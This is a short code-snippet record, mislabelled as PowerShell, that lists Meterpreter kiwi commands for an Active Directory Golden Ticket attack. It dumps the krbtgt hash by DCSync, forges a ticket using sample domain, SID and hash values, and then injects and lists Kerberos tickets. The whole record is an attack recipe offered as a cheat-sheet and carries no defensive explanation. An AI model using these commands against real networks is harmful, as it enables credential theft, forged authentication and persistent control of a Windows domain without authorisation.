---
id: 1f301bcb-89e0-4e2d-8dbf-745783ec4838
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:04.748752+00:00'
updated_at: '2023-04-10T20:25:44.408327+00:00'
---

# Code Snippet 1f301bcb

**Language**: Powershell

```powershell
# Get info - Meterpreter(kiwi)
dcsync_ntlm krbtgt
dcsync krbtgt

# Forge a Golden ticket - Meterpreter
load kiwi
golden_ticket_create -d <domainname> -k <nthashof krbtgt> -s <SID without le RID> -u <user_for_the_ticket> -t <location_to_store_tck>
golden_ticket_create -d pentestlab.local -u pentestlabuser -s S-1-5-21-3737340914-2019594255-2413685307 -k d125e4f69c851529045ec95ca80fa37e -t /root/Downloads/pentestlabuser.tck
kerberos_ticket_purge
kerberos_ticket_use /root/Downloads/pentestlabuser.tck
kerberos_ticket_list
```


